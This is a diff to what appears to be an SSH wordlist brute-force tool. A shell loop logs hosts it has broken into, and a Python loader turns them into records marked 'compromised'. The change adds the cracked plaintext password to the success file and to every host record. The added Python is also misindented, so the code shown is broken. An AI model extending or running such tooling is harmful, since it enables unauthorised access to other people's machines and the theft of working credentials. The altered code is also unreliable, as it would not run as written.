@@ -726,15 +726,16 @@ while IFS= read -r TARGET; do
                         "WORDLIST_SUCCESS ip=$TARGET service=ssh username=$USERNAME attempts=$SSH_ATTEMPTS"
 
 
-                    printf '%s|%s|ssh|%s|%s|%s|%s|%s\n' \
-                        "$TARGET" \
-                        "$PLATFORM" \
-                        "$SSH_PORT" \
-                        "$USERNAME" \
-                        "$HOSTNAME" \
-                        "$OS_NAME" \
-                        "$SSH_ATTEMPTS" \
-                        >> "$SUCCESS_FILE"
+                printf '%s|%s|ssh|%s|%s|%s|%s|%s|%s\n' \
+                    "$TARGET" \
+                    "$PLATFORM" \
+                    "$SSH_PORT" \
+                    "$USERNAME" \
+                    "$HOSTNAME" \
+                    "$OS_NAME" \
+                    "$SSH_ATTEMPTS" \
+                    "$PASSWORD" \
+                    >> "$SUCCESS_FILE"
 
 
                     unset PASSWORD
@@ -985,68 +986,74 @@ with open(
 
         parts = raw.split("|")
 
-        while len(parts) < 8:
-            parts.append("")
+        while len(parts) < 9:
+                parts.append("")
 
-
-        (
-            ip,
-            platform,
-            access,
-            port,
-            username,
-            hostname,
-            os_name,
-            attempts,
-        ) = parts[:8]
+            (
+                ip,
+                platform,
+                access,
+                port,
+                username,
+                hostname,
+                os_name,
+                attempts,
+                password,
+            ) = parts[:9]
 
 
         if ip in existing_by_ip:
             continue
 
 
-        host = {
+       host = {
 
-            "ip": ip,
+                "ip": ip,
 
-            "platform": platform,
+                "platform": platform,
 
-            "access": access,
+                "access": access,
 
-            "primary_access": access,
+                "primary_access": access,
 
-            "authenticated": True,
+                "authenticated": True,
 
-            "compromised": True,
+                "compromised": True,
 
-            "credential_method": "wordlist",
+                "credential_method": "wordlist",
 
-            "wordlist_attempts": int(
-                attempts or 0
-            ),
+                "username": username,
 
-            "hostname": hostname,
+                "password": password,
 
-            "os": os_name,
+                "wordlist_attempts": int(
+                    attempts or 0
+                ),
 
-            "access_methods": {
+                "hostname": hostname,
 
-                access: {
+                "os": os_name,
 
-                    "authenticated": True,
+                "access_methods": {
 
-                    "port": int(port),
+                    access: {
 
-                    "username": username,
+                        "authenticated": True,
 
-                    "method": "wordlist",
+                        "port": int(port),
 
-                    "attempts": int(
-                        attempts or 0
-                    ),
-                }
-            },
-        }
+                        "username": username,
+
+                        "password": password,
+
+                        "method": "wordlist",
+
+                        "attempts": int(
+                            attempts or 0
+                        ),
+                    }
+                },
+            }
 
 
         if access == "ssh":
